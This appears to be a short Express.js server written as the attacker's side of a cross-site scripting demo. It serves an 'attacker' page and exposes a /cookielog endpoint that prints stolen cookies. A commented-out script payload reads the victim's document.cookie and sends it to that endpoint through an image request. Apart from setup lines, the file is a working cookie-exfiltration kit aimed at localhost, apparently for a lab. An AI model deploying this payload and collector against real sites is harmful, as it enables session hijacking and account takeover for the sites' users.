// === SETUP ===
const express = require('express');
const cookieParser = require('cookie-parser')

const app = express();

app.set('view engine', 'hbs')
app.use(express.urlencoded({ extended: 'false' }))
app.use(express.json())
app.use(cookieParser());


app.get("/", (req, res) => { res.render("attacker") })
app.get("/cookielog", (req, res) => {

    console.log(req.query.cookie);
})

/*
<script>
    // send the victim's cookie to a remote server
    var cookie = document.cookie;
    var url = "http://localhost:5000/cookielog?cookie=" + encodeURIComponent(cookie);
    var img = new Image();
    img.src = url;
</script>
*/


app.listen(5000, () => {
    console.log("server started on port 5000")
})